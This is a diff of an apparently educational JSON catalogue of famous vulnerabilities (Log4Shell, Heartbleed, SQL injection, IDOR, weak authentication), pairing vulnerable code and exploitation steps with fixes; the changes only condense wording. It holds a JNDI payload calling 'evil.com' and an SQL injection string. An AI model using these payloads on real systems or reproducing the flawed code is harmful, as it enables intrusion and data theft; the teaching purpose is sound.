@@ -6,10 +6,10 @@
       "severity": "CRITICAL",
       "owasp": "A03 - Injection",
       "cwe": "CWE-502",
-      "description": "Found in December 2021 in Java's Log4j logging library. Practically the entire internet was affected — Microsoft, Apple, Amazon, Tesla and more.",
+      "description": "Found in December 2021 in Java Log4j library. Entire internet was affected — Microsoft, Apple, Amazon, Tesla.",
       "vulnerable_code": "${jndi:ldap://evil.com/exploit}",
-      "how_exploit": "Attacker sends this string in any input field. Log4j automatically executes it while logging — downloads and runs code from attacker's server. Remote Code Execution.",
-      "fix": "Upgrade to Log4j version 2.17.1 or above. Disable JNDI lookups.",
+      "how_exploit": "Attacker sends this string in any input. Log4j executes it while logging — downloads and runs code from attacker server. Full Remote Code Execution.",
+      "fix": "Upgrade to Log4j 2.17.1+. Disable JNDI lookups.",
       "fixed_code": "log4j2.formatMsgNoLookups=true"
     },
     {
@@ -18,9 +18,9 @@
       "severity": "CRITICAL",
       "owasp": "A02 - Cryptographic Failures",
       "cwe": "CWE-126",
-      "description": "Memory leak bug in the OpenSSL library. Attackers could read the server's private memory — passwords, private keys, session tokens — all exposed.",
-      "vulnerable_code": "memcpy(bp, p, payload);\n// payload size was never validated!",
-      "how_exploit": "Attacker sends a crafted heartbeat request with a larger payload size than actual data. Server returns extra memory contents without validation — leaking sensitive data.",
+      "description": "Memory leak in OpenSSL library. Attackers could read server private memory — passwords, private keys, session tokens.",
+      "vulnerable_code": "memcpy(bp, p, payload);\n// payload size never validated!",
+      "how_exploit": "Attacker sends heartbeat request with larger payload size than actual data. Server returns extra memory without validation — sensitive data leaked.",
       "fix": "Update OpenSSL to version 1.0.1g or higher.",
       "fixed_code": "if (payload + padding > s->s3->rrec.length)\n    return 0; // Reject invalid request"
     },
@@ -30,10 +30,10 @@
       "severity": "CRITICAL",
       "owasp": "A03 - Injection",
       "cwe": "CWE-89",
-      "description": "Most common and dangerous vulnerability. Allows attackers to directly control and manipulate the database.",
+      "description": "Most common and dangerous vulnerability. Allows attackers to directly control the database.",
       "vulnerable_code": "query = \"SELECT * FROM users WHERE name='\" + username + \"'\"",
-      "how_exploit": "Enter as username: ' OR '1'='1\nQuery becomes: SELECT * FROM users WHERE name='' OR '1'='1'\nResult: Entire database is exposed!",
-      "fix": "Use parameterized queries — keep user input completely separate from the SQL query.",
+      "how_exploit": "Enter as username: ' OR '1'='1\nQuery becomes: SELECT * FROM users WHERE name='' OR '1'='1'\nResult: Entire database exposed!",
+      "fix": "Use parameterized queries — keep user input separate from SQL query.",
       "fixed_code": "cursor.execute('SELECT * FROM users WHERE name=?', (username,))"
     },
     {
@@ -42,11 +42,11 @@
       "severity": "HIGH",
       "owasp": "A01 - Broken Access Control",
       "cwe": "CWE-284",
-      "description": "OWASP #1 vulnerability in 2021. Changing the ID in a URL allows access to another user's data without authorization.",
+      "description": "OWASP #1 vulnerability in 2021. Changing the ID in a URL allows access to another user's data.",
       "vulnerable_code": "# URL: /profile?id=123\nuser = db.get_user(request.args.get('id'))\nreturn user.data  # No authorization check!",
-      "how_exploit": "Change id=123 to id=124 in the URL — another user's profile is returned. There is no server-side authorization check.",
+      "how_exploit": "Change id=123 to id=124 in URL — another user's profile is returned. No server-side authorization check exists.",
       "fix": "Always perform server-side authorization checks on every request.",
-      "fixed_code": "user = db.get_user(request.args.get('id'))\nif user.id != current_user.id:\n    return 403  # Forbidden\nreturn user.data"
+      "fixed_code": "user = db.get_user(request.args.get('id'))\nif user.id != current_user.id:\n    return 403\nreturn user.data"
     },
     {
       "id": "OWASP-A07-BrokenAuth",
@@ -54,11 +54,11 @@
       "severity": "HIGH",
       "owasp": "A07 - Auth Failures",
       "cwe": "CWE-287",
-      "description": "Weak authentication mechanisms that allow attackers to hijack user accounts.",
-      "vulnerable_code": "# Weak JWT secret\njwt.encode(payload, 'secret', algorithm='HS256')\n# Password stored in plain text\ndb.save(password=user_password)",
-      "how_exploit": "Weak JWT secrets can be cracked using brute force. Plain text passwords are immediately exposed in any database leak.",
-      "fix": "Use strong secrets, always hash passwords, and implement Multi-Factor Authentication (MFA).",
-      "fixed_code": "import secrets\nimport bcrypt\njwt_secret = secrets.token_hex(32)\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())"
+      "description": "Weak authentication that allows attackers to hijack user accounts easily.",
+      "vulnerable_code": "jwt.encode(payload, 'secret', algorithm='HS256')\ndb.save(password=user_password)",
+      "how_exploit": "Weak JWT secrets can be brute forced. Plain text passwords are immediately exposed in database leaks.",
+      "fix": "Use strong secrets, hash all passwords, implement MFA.",
+      "fixed_code": "import secrets, bcrypt\njwt_secret = secrets.token_hex(32)\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())"
     }
   ]
 }
